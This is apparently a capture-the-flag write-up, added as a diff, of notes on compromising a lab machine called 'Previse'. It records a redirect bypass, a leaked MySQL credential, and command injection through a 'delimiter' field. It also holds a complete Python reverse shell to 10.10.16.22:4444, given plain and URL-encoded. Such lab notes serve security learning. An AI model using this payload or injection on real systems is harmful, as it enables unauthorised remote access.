@@ -1,0 +1,28 @@
+Previse (Easy):
+nmap
+22 (7.2 ssh)
+80 (apache not vuln)
+No visible service vulnerability, try web exploits?
+80
+dirbuster reveals lots of things
+got lucky and guessed admin:admin
+cannot believe how lucky that was, wow
+Correct way
+intercept new account page request with burp
+change request status from 302 to 200
+add a user
+Download the siteBackup
+read config.php
+root:mySQL_p@ssw0rd!:)
+Noticed that log.php downloads the logs of file changes
+passes input from “delimiter” directly to python
+no sanitation, inject?
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+URL ENCODE:
+%26python%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket(socket.AF_INET%252Csocket.SOCK_STREAM)%253Bs.connect((%252210.10.16.22%2522%252C4444))%253Bos.dup2(s.fileno()%252C0)%253B%2520os.dup2(s.fileno()%252C1)%253B%2520os.dup2(s.fileno()%252C2)%253Bp%253Dsubprocess.call(%255B%2522%252Fbin%252Fsh%2522%252C%2522-i%2522%255D)%253B%2527
+intercept the log download request, and append this to the end of the “delimiter” category after tab, comma, or space
+dont forget to start a nc catcher for the revshell
+caught revshell!
+
+www-data
+exited the shell on accident and cant get it back…
